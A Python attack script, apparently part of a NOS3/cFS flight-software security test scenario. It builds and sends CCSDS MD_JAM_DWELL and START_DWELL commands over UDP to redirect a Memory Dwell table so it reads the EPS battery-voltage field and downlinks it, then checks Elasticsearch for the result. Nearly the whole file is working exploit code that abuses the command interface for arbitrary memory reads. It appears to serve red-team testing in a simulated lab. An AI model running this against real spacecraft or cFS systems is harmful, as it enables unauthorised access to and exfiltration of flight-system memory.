#!/usr/bin/env python3
"""
attack_md_jam.py — Scenario 2 Phase B: MD Dwell JAM for EPS exfiltration

Uses MD app's JAM_DWELL and START_DWELL commands to redirect Dwell Table 2,
Entry 1 to read GENERIC_EPS_AppData.HkTelemetryPkt.DeviceHK.BatteryVoltage
(uint16 at estimated offset 0x24 within GENERIC_EPS_AppData). The MD app
then downlinks the battery voltage in dwell telemetry packets — no memory
corruption required. This exploits MD's intended design for arbitrary memory
reads.

Effect: MD dwell telemetry Data[0..1] bytes should match EPS BatteryVoltage.
        Kibana: search msg_name:"MD_DWELL_PKT" to see the downlinked value.

NOTE: Offset 0x24 is an engineering estimate from static struct analysis
(generic_eps_app.h → generic_eps_msg.h → generic_eps_device.h). Verify at
runtime with: nm cf/generic_eps.so | grep GENERIC_EPS_AppData
and: pahole -C GENERIC_EPS_AppData_t cf/generic_eps.so

Usage:
    python3 attack_md_jam.py [OPTIONS]

Options:
    --host        Target host (default: 127.0.0.1)
    --port        CI UDP port (default: 5010)
    --offset      Byte offset of BatteryVoltage within GENERIC_EPS_AppData
                  (default: 0x24 = 36; verify with pahole at runtime)
    --table-id    MD dwell table to reconfigure (default: 2)
    --entry-id    Dwell table entry index to JAM (default: 1, 1-based)
    --kibana-url  Elasticsearch URL for dwell packet confirmation
    --no-confirm  Skip Kibana confirmation poll

References:
    MD_CMD_MID          = 0x1890  (default_md_msgid_values.h)
    MD_JAM_DWELL_CC     = 4       (default_md_fcncode_values.h)
    MD_START_DWELL_CC   = 2       (default_md_fcncode_values.h)
    MD_CmdJam_Payload_t           (default_md_msgdefs.h)
    MD_CmdStartStop_Payload_t     (default_md_msgdefs.h)
    F8 overflow context           (.ai-memory/tasks/test_plans.md Scenario 2)
"""

import argparse
import json
import socket
import struct
import time
import urllib.error
import urllib.request

# ---------------------------------------------------------------------------
# CCSDS constants
# ---------------------------------------------------------------------------
CCSDS_TYPE_CMD = 1
CCSDS_SEC_HDR  = 1
CCSDS_APID_MASK = 0x07FF

# ---------------------------------------------------------------------------
# MD message IDs and function codes (default_md_msgid_values.h,
# default_md_fcncode_values.h)
# ---------------------------------------------------------------------------
MD_CMD_MID        = 0x1890
MD_JAM_DWELL_CC   = 4
MD_START_DWELL_CC = 2

# ---------------------------------------------------------------------------
# Target symbol and default offset
# ---------------------------------------------------------------------------
EPS_SYMBOL_NAME    = "GENERIC_EPS_AppData"
EPS_BATT_OFFSET_DEFAULT = 0x24   # offset of BatteryVoltage within AppData struct

# MD_SymAddr_t.SymName field length matches CFE_MISSION_MAX_PATH_LEN = 64
MD_SYM_NAME_LEN = 64


def _ccsds_primary(apid: int, seq: int, data_len: int) -> bytes:
    """Build a 6-byte CCSDS primary command header (big-endian)."""
    stream_id = (CCSDS_TYPE_CMD << 12) | (CCSDS_SEC_HDR << 11) | (apid & CCSDS_APID_MASK)
    return struct.pack(">HHH", stream_id, seq, data_len)


def _ccsds_secondary(cc: int) -> bytes:
    """Build a 2-byte CCSDS secondary command header (cc + zero checksum)."""
    return struct.pack("BB", cc & 0x7F, 0x00)


def build_jam_cmd(table_id: int, entry_id: int,
                  field_length: int, dwell_delay: int,
                  sym_name: str, offset: int,
                  seq: int = 0xC000) -> bytes:
    """
    Build a MD_JAM_DWELL_CC CCSDS command packet.

    MD_CmdJam_Payload_t layout (little-endian on amd64):
        TableId     (uint16)  — 1-based table index
        EntryId     (uint16)  — 1-based entry index
        FieldLength (uint16)  — bytes to read: 1, 2, or 4
        DwellDelay  (uint16)  — wakeup ticks before next dwell
        Offset      (uint64)  — cpuaddr = absolute addr when SymName is empty,
                                OR byte offset within symbol when SymName set
        SymName     (char[64])— null-terminated symbol name (zero-padded)
    Total payload = 2+2+2+2+8+64 = 80 bytes
    data_len field = (2 secondary + 80 payload) - 1 = 81
    """
    payload = struct.pack(
        "<HHHHQ64s",
        table_id,
        entry_id,
        field_length,
        dwell_delay,
        offset,
        sym_name.encode("ascii")[:MD_SYM_NAME_LEN].ljust(MD_SYM_NAME_LEN, b"\x00"),
    )
    data_len = 2 + len(payload) - 1  # secondary header + payload, minus 1
    pri = _ccsds_primary(MD_CMD_MID & CCSDS_APID_MASK, seq, data_len)
    sec = _ccsds_secondary(MD_JAM_DWELL_CC)
    return pri + sec + payload


def build_start_dwell_cmd(table_mask: int, seq: int = 0xC001) -> bytes:
    """
    Build a MD_START_DWELL_CC CCSDS command packet.

    MD_CmdStartStop_Payload_t layout (little-endian):
        TableMask (uint16) — bitmask: bit0=TBL1, bit1=TBL2, ...
        Padding   (uint16) — zero
    Total payload = 4 bytes
    data_len field = (2 secondary + 4 payload) - 1 = 5
    """
    payload  = struct.pack("<HH", table_mask, 0)
    data_len = 2 + len(payload) - 1
    pri = _ccsds_primary(MD_CMD_MID & CCSDS_APID_MASK, seq, data_len)
    sec = _ccsds_secondary(MD_START_DWELL_CC)
    return pri + sec + payload


def poll_kibana_dwell(es_url: str, timeout: float = 30.0) -> bool:
    """
    Poll Elasticsearch for recent MD dwell packet events.
    Returns True if at least one dwell event found in the last 60 seconds.
    """
    query = json.dumps({
        "query": {
            "bool": {
                "must": [
                    {"range": {"@timestamp": {"gte": "now-60s"}}}
                ],
                "filter": [
                    {"wildcard": {"msg_name": "*DWELL*"}}
                ]
            }
        },
        "size": 0
    }).encode()

    deadline = time.time() + timeout
    print(f"[*] Polling {es_url}/nos3-telemetry-*/_search for MD dwell events (timeout {timeout:.0f}s)...")
    while time.time() < deadline:
        try:
            req = urllib.request.Request(
                f"{es_url}/nos3-telemetry-*/_search",
                data=query,
                headers={"Content-Type": "application/json"},
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                data  = json.loads(resp.read())
                count = data.get("hits", {}).get("total", {}).get("value", 0)
                if count > 0:
                    print(f"[+] MD dwell events detected: {count} in last 60s")
                    return True
                print(f"    Waiting for dwell events... ({count} so far)", flush=True)
        except (urllib.error.URLError, Exception) as exc:
            print(f"    ES query failed: {exc}", flush=True)
        time.sleep(3)
    return False


def main() -> None:
    parser = argparse.ArgumentParser(
        description="MD JAM: redirect Dwell Table 2 to exfiltrate EPS BatteryVoltage (Scenario 2 Phase B)"
    )
    parser.add_argument("--host",       default="127.0.0.1",
                        help="Target host (default: 127.0.0.1)")
    parser.add_argument("--port",       type=int, default=5010,
                        help="CI UDP port (default: 5010)")
    parser.add_argument("--offset",     type=lambda x: int(x, 0),
                        default=EPS_BATT_OFFSET_DEFAULT,
                        help=f"Byte offset of BatteryVoltage in GENERIC_EPS_AppData "
                             f"(default: 0x{EPS_BATT_OFFSET_DEFAULT:02X}; verify with pahole)")
    parser.add_argument("--table-id",   type=int, default=2,
                        help="MD dwell table to reconfigure (default: 2)")
    parser.add_argument("--entry-id",   type=int, default=1,
                        help="Dwell entry index to JAM, 1-based (default: 1)")
    parser.add_argument("--kibana-url", default="http://localhost:9200",
                        help="Elasticsearch base URL (default: http://localhost:9200)")
    parser.add_argument("--no-confirm", action="store_true",
                        help="Skip Kibana dwell packet confirmation poll")
    args = parser.parse_args()

    # Table mask bit: table 1 → bit 0 (0x0001), table 2 → bit 1 (0x0002), etc.
    table_mask = 1 << (args.table_id - 1)

    print(f"[*] MD JAM attack — Scenario 2 Phase B: EPS BatteryVoltage exfiltration")
    print(f"[*] Target:     {args.host}:{args.port}")
    print(f"[*] MD Table:   {args.table_id}, Entry: {args.entry_id}")
    print(f"[*] Symbol:     {EPS_SYMBOL_NAME} + offset 0x{args.offset:02X}")
    print(f"[*] FieldLen:   2 bytes (uint16 BatteryVoltage)")
    print()

    jam_pkt   = build_jam_cmd(
        table_id=args.table_id,
        entry_id=args.entry_id,
        field_length=2,
        dwell_delay=1,
        sym_name=EPS_SYMBOL_NAME,
        offset=args.offset,
    )
    start_pkt = build_start_dwell_cmd(table_mask=table_mask)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(jam_pkt, (args.host, args.port))
        print(f"[+] MD_JAM_DWELL_CC sent   ({len(jam_pkt)} bytes)")
        time.sleep(0.1)

        sock.sendto(start_pkt, (args.host, args.port))
        print(f"[+] MD_START_DWELL_CC sent ({len(start_pkt)} bytes, TableMask=0x{table_mask:04X})")
    finally:
        sock.close()

    print()
    print("[*] Expected outcome:")
    print(f"    MD Dwell Table {args.table_id} Entry {args.entry_id} now reads EPS BatteryVoltage")
    print("    MD dwell packets will contain Data[0..1] = BatteryVoltage (uint16 LE)")
    print()
    print("[*] Verify with Kibana:")
    print(f"    GET {args.kibana_url}/nos3-telemetry-*/_search")
    print('    Filter: msg_name wildcard "*DWELL*"  — look for MD dwell telemetry events')
    print()
    print("[*] Cross-check: compare Data[0..1] against EPS HK BatteryVoltage field")
    print("    (EPS HK MID = 0x091A, BatteryVoltage at byte offset 16 of HK packet)")
    print()
    print("[!] NOTE: offset 0x{:02X} is a static estimate. If Data[0..1] does not match".format(args.offset))
    print("    EPS HK voltage, run: make debug → pahole -C GENERIC_EPS_AppData_t cf/generic_eps.so")
    print("    Then re-run with: --offset <corrected_hex_offset>")

    if not args.no_confirm:
        found = poll_kibana_dwell(args.kibana_url, timeout=30.0)
        if not found:
            print("[WARN] No MD dwell events detected in Kibana within 30s.")
            print("       Check: is MD app running? Is SCH wakeup scheduled?")
            print("       Verify: sch_def_schtbl.c slot #54 enables MD_WAKEUP_MID at 1Hz.")


if __name__ == "__main__":
    main()
